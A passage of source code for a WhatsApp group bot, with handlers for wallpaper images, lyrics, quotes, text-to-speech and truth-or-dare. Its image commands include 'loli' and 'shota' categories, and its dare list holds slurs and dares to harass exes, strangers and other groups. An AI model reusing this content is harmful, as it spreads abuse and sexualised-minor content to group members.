        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await AlyaStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: yeha}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'lyrics': {
if (!text) return replygcalya(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
await AlyaStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const alyalirik = `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: alyalirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pick': {
            	if (!m.isGroup) return AlyaStickGroup()
            	if (!text) return replygcalya(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await AlyaBotInc.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let alyashimts = member[Math.floor(Math.random() * member.length)]
             let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `The most *${text}* here is *@${alyashimts.split("@")[0]}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [alyashimts], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
             
         }
     break
     case 'say': case 'tts': case 'gtts':{
if (!text) return replygcalya('Where is the text?')
            let texttts = text
            const alyarl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return AlyaBotInc.sendMessage(m.chat, {
                audio: {
                    url: alyarl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} *Fact:* ${data.fact}\n`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
    }
    break
    case 'quotes':{
const quotealya = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotealya.data.quote.body}\n\n*${themeemoji} Author:* ${quotealya.data.quote.author}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: textquotes
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'truth': case 'dare': {
	bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease Choose The Button Below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Truth 🌝\",\"id\":\"${prefix}turut"}`
            },
{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Dare 🌚\",\"id\":\"${prefix}dere"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'dere':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner alya through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const alyadare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n'+ alyadare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}dare"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
              break
                            break
       case 'turut':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
